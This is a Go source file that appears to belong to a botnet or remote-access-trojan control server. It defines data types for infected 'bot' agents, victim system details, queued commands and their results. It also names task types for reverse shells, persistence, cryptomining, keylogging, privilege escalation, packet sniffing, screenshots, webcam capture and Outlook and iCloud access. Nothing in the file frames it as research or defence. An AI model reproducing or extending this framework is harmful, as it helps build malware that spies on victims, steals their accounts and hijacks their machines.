package shared

import (
	"time"
)

// SystemInfo contains basic system information for tracking agents
type SystemInfo struct {
	Hostname     string   `json:"hostname"`
	InternalIP   string   `json:"internal_ip"`
	ExternalIP   string   `json:"external_ip"`
	OS           string   `json:"os"`
	Architecture string   `json:"architecture"`
	Username     string   `json:"username"`
	UID          string   `json:"uid"`
	Processes    []string `json:"processes,omitempty"`
	Uptime       int64    `json:"uptime"`
}

// Task represents a command to be executed by the agent
type Task struct {
	ID         string            `json:"id"`
	Type       string            `json:"type"`           // Command type (shell, plugin, etc)
	Command    string            `json:"command"`        // Command to execute
	Args       map[string]string `json:"args,omitempty"` // Arguments for the command
	Timeout    int               `json:"timeout,omitempty"`
	CreateTime time.Time         `json:"create_time"`
}

// Result represents the output of a task execution
type Result struct {
	TaskID     string    `json:"task_id"`
	AgentID    string    `json:"agent_id"`
	Output     string    `json:"output"`
	Error      string    `json:"error,omitempty"`
	ExitCode   int       `json:"exit_code"`
	StartTime  time.Time `json:"start_time"`
	FinishTime time.Time `json:"finish_time"`
	Data       []byte    `json:"data,omitempty"` // For binary data like screenshots
}

// Agent represents a connected bot
type Agent struct {
	ID           string     `json:"id"`
	LastSeen     time.Time  `json:"last_seen"`
	FirstSeen    time.Time  `json:"first_seen"`
	SystemInfo   SystemInfo `json:"system_info"`
	IP           string     `json:"ip"`
	Online       bool       `json:"online"`
	Version      string     `json:"version"`
	Capabilities []string   `json:"capabilities"`
}

// Constants for task types
const (
	TaskTypeShell          = "shell"
	TaskTypeReverseShell   = "reverse_shell"
	TaskTypePersistence    = "persistence"
	TaskTypeMiner          = "miner"
	TaskTypeKeylogger      = "keylogger"
	TaskTypeEscalate       = "escalate"
	TaskTypePacketSniffer  = "packet_sniffer"
	TaskTypeScreenshot     = "screenshot"
	TaskTypeWebcam         = "webcam"
	TaskTypePortScan       = "port_scan"
	TaskTypeProcessControl = "process_control"
	TaskTypeOutlook        = "outlook"
	TaskTypeICloud         = "icloud"
)